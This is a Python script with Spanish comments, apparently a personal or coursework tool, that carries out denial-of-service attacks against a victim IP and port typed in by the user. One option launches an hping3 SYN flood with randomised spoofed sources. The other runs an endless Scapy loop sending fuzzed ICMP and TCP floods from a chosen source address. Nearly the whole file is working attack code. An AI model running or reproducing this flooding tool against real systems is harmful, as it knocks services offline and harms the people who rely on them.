#!/usr/bin/env python
# -*- coding: utf-8 -*-

####################################################
# El proceso se debe de ejecutar con sudo          #
# sudo python3 Mi_ataque_dos.py                    #
####################################################
########################################################
# Ataque DOS (denegacion de servicio) utilizando       #
# scapy, se pasa por parametro IP origen por defecto   #
# es la de la maquina atacante,IP victima  y el puerto #
# de origen y destino                                  #
########################################################

from scapy.all import *
from termcolor import colored
import socket
import os
import sys

####################################################
# Se introduce la IP atacante y se valida que es   #
# correcta                                         #
####################################################
def introducirIP():
    IPAtacante=input(colored("POR FAVOR, INTRODUZCA IP ATACANTE: ",'green',attrs=['bold']))
    validarIP(IPAtacante)
    return IPAtacante.strip()

####################################################
# Se realiza ataque DOS pasando la IP Victima      #
# asi como puerto origen y destino                 #
# la IP origen es la IP por defecto de la maquina  #
# atacante.                                        #
####################################################
def ataqueDos(IPvict,portOrigen,portDestino):
    numero_paquete = 1000
    ##obtenmos la ip de la maquina atacante
    nombre_equipo = socket.gethostname()
    direccion_equipo = socket.gethostbyname(nombre_equipo + ".local")


    print ("Nombre del equipo atacante:  %s" %nombre_equipo )
    print ("IP del equipo atacante:      %s" %direccion_equipo)

    print("                                                 ")
    print(colored("DIRECCION IP ATACANTE: ",'green',attrs=['bold']) ,colored(direccion_equipo,'blue',attrs=['bold']))
    print("                                                 ")
    IPChange=input(colored("¿Desea cambiar direccion IP atacante(S-->SI,N-->NO)?: ",'green',attrs=['bold']))
    print("                                                 ")

    if IPChange.upper()=='S':
        IPataque=introducirIP()
    elif IPChange.upper()=='N':
        IPataque=direccion_equipo
    else:
        print(colored("[-] Opcion NO valida, debe indicar S o N ",'red',attrs=['bold']))
        print("                                                 ")
        time.sleep(3)
        borrarPantalla()
        main

    print(colored('TIPO DE ATAQUE DOS: ','green',attrs=['bold']))
    print(colored('  1.-)HPING3 ATAQUE DOS: ','green',attrs=['bold']))
    print(colored('  2.-)SPAKY ATAQUE DOS: ','green',attrs=['bold']))
    print('                                                             ')

    ataque=input(colored('ELEGIR TIPO DE ATAQUE DOS: ','green',attrs=['bold']))
    print('                                                             ')
    if ataque=='1':

        os.system('hping3 --rand-source -p ' +  portDestino +  ' -S --flood ' +  IPvict)
    #   os.system('hping3 -c 10000  -d 120 --rand-source -p ' +  portDestino +  ' -S --flood ' +  IPvict)

    elif ataque=='2':

        #bucle infinito
        while True:
            #Atacamos al protocolo ICMP con fuzz
            print('Comienzo primer ataque.... ICMP')
            IP_ataque = IP(src=IPataque,dst=IPvict)
            imcp=fuzz(ICMP())
            pakete=IP_ataque/imcp
            send(pakete *1000,iface="eth0")
        #bucle infinito
        #while True:
            #indicamos ip atacante y victima, protocolo y puerto  origen y destino
            print('Comienzo segundo ataque.... TCP')
            IP_ataque = IP(src=IPataque,dst=IPvict)
            TCP_ataque = TCP(sport=int(portOrigen),dport=int(portDestino))
            pakete = IP_ataque/TCP_ataque

            #Enviamos 100 paquetes en intervalos de 0,001 segundos
            send(pakete,count=1000,inter =0.001)


            print ("Paquete enviado numero: ", numero_paquete)
            numero_paquete = numero_paquete + 1000
    else:
        print(colored("[-] Tipo de ataque Dos erroneo",'red',attrs=['bold']))
        exit()

#  Mandamos paquetes en bucle con loop=1 seria igual que hacerlo con while
#    send(pakete,loop=1,inter = .0001)

####################################################
# Se borra las pantalla
####################################################
def borrarPantalla():
    if os.name == "posix":
        os.system ("clear")
    elif os.name == "ce" or os.name == "nt" or os.name == "dos":
        os.system ("cls")
######################################################
# Se valida que la ip tenga formato correcto         #
# al menos que tenga 3  puntos xxx.xxx.xxx.xxx       #
# y que todo los caracteres sean numericos           #
######################################################
def validarIP(IPEntrada):
    totalPuntos=0
    for i in IPEntrada:
        if i==".":
            totalPuntos=totalPuntos +1
        else:
            if i.isdigit()==False:
                print(colored("[-] IP Rango con valores no numericos",'red',attrs=['bold']))
                print("                                                 ")
                time.sleep(3)
                borrarPantalla()
                main()
    if totalPuntos < 3:
        print(colored("[-] IP con formato no valido debe ser del tipo XXX.XXX.XXX.XXX ",'red',attrs=['bold']))
        print("                                                 ")
        time.sleep(3)
        borrarPantalla()
        main()

#####################################################
# Se valida que el puerto sea numerico              #
#####################################################
def validarPuerto(puertoEntrada):
    if puertoEntrada.isdigit()==False or len(puertoEntrada)==0:
        print(colored("[-] Puerto no informado o no numerico",'red',attrs=['bold']))
        print("                                                 ")
        time.sleep(3)
        borrarPantalla()
        main()

#####################################################
# Parrafo principal de la ejecuion de programa      #
#####################################################
def ataqueDOS():

    borrarPantalla()

    print(colored("****************************",'green',attrs=['bold']))
    print(colored("    EJECUCION ATAQUE DOS    ",'green',attrs=['bold']))
    print(colored("****************************",'green',attrs=['bold']))
    print("                                                       ")

    ##Validamos que el usuario que ejecuta el script es root
    if os.getuid()!= 0:
        print(colored("[-]Debe de ejecutar el script con usuario administrador,ejemplo:sudo python3 Mi_ataque_dos.py",'red',attrs=['bold']))
        exit()

    IPvictima=input(colored("POR FAVOR, INTRODUZCA IP VICTIMA: ",'green',attrs=['bold']))
    validarIP(IPvictima.strip())

    puertoOrigen=input(colored("POR FAVOR, INTRODUZCA PUERTO ORIGEN: ",'green',attrs=['bold']))
    validarPuerto(puertoOrigen.strip())

    puertoDestino=input(colored("POR FAVOR, INTRODUZCA PUERTO DESTINO: ",'green',attrs=['bold']))
    validarPuerto(puertoDestino.strip())

    ataqueDos(IPvictima.strip(),puertoOrigen.strip(),puertoDestino.strip())
